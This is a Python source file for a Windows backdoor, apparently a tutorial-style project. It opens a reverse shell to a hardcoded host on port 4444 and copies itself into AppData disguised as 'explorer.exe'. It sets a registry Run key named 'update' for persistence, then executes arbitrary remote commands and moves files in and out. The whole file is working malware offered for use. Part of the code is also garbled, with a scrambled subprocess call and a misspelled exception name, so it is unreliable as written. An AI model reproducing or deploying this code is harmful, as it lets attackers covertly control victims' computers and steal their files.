import socket
import subprocess
import json
import os
import base64
import sys
import shutil


class Backdoor:

    def __init__(self):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect(("192.168.1.101", 4444))
        self.connection.send(b"[+] Connection Established \n")


    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"',shell=True)

    def change_directory_to(self, path):
        os.chdir(path)
        x = "Changing directory to " + path
        return x

    def reliable_send(self, commands):
        json_data = json.dumps(commands)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "uploaded successfully..!"

    def execute_command(self, command):
        try:
            DEVNULL = open(os.devnull,'wb')
            return subprocess.check_output(command, shell=True,stderr=ULL,std DEVNin= DEVNULL)
        except subprocess.calledProcessError:
            return "[-} Error check the inputs"

    def run(self):
        while True:

            command = self.reliable_receive()
            try:
                if command[0] == "upload":
                    output = self.write_file(command[1], command[2])

                elif command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    output = self.change_directory_to(command[1])
                elif command[0] == "download":
                    output = self.read_file(command[1])
                else:
                    output = self.execute_command(command)
            except Exception:
                output = "[-] Error check the inputs"
            self.reliable_send(output)



my_backdoor = Backdoor()
my_backdoor.run()